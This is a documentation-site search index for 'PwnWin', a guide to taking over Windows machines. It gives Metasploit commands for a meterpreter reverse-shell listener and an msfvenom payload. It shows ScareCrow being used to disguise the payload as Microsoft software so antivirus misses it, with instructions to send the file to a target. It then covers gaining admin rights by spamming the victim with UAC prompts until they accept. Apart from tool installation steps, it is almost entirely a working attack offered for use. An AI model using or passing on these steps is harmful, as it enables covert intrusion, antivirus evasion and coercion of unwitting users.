{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to PwnWin This is my research on how to attack a Windows machine with a reverse shell. Get started","title":"Welcome to PwnWin"},{"location":"#welcome-to-pwnwin","text":"This is my research on how to attack a Windows machine with a reverse shell. Get started","title":"Welcome to PwnWin"},{"location":"01%20-%20Setting%20up/","text":"Install Metasploit Install ScareCrow","title":"01   Setting up"},{"location":"02%20-%20Start%20the%20listener/","text":"sudo msfconsole -q msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp msf6 exploit(multi/handler) > set lhost YOUR_IP msf6 exploit(multi/handler) > set lport ANY_PORT msf6 exploit(multi/handler) > run","title":"02   Start the listener"},{"location":"03%20-%20Create%20an%20executable/","text":"# Spawn a Metasploit executable msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f raw -o av-bypass.bin # Make the executable undetectable ./ScareCrow -I av-bypass.bin -domain www.microsoft.com -encryptionmode AES # This spawns a random exe, like powerpoint, onedrive, etc. I've tried with excel and it worked first try. Now send the generated executable to a Windows machine, and that's all!","title":"03   Create an executable"},{"location":"04%20-%20Get%20admin%20rights/","text":"I've tried multiple exploit that do this, but this way was the only one I've managed to get working while keeping the antivirus on. meterpreter > background msf6 exploit(multi/handler) > use exploit/windows/local/ask msf6 exploit(windows/local/ask) > set session 1 msf6 exploit(windows/local/ask) > set technique PSH msf6 exploit(windows/local/ask) > exploit After running this, the user will be prompted with a UAC prompt. Even if they click no, you can still spam them, until they click yes. After that, metasploit will open a new session with admin rights.","title":"04   Get admin rights"},{"location":"Installs/Install%20Metasploit/","text":"To install Metasploit, run this command: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall","title":"Install Metasploit"},{"location":"Installs/Install%20ScareCrow/","text":"To create undetectable executables, you need to install ScareCrow. # Install dependencies sudo apt install openssl osslsigncode mingw-w64 -y # Download, extract and install golang wget https://go.dev/dl/go1.21.4.linux-amd64.tar.gz -o go.tar.gz sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go.tar.gz export PATH=$PATH:/usr/local/go/bin rm -rf go.tar.gz # Download and build ScareCrow git clone https://github.com/Tylous/ScareCrow cd ScareCrow go get github.com/fatih/color go get github.com/yeka/zip go get github.com/josephspurrier/goversioninfo go get github.com/Binject/debug/pe go get github.com/awgh/rawreader go build ScareCrow.go","title":"Install ScareCrow"}]}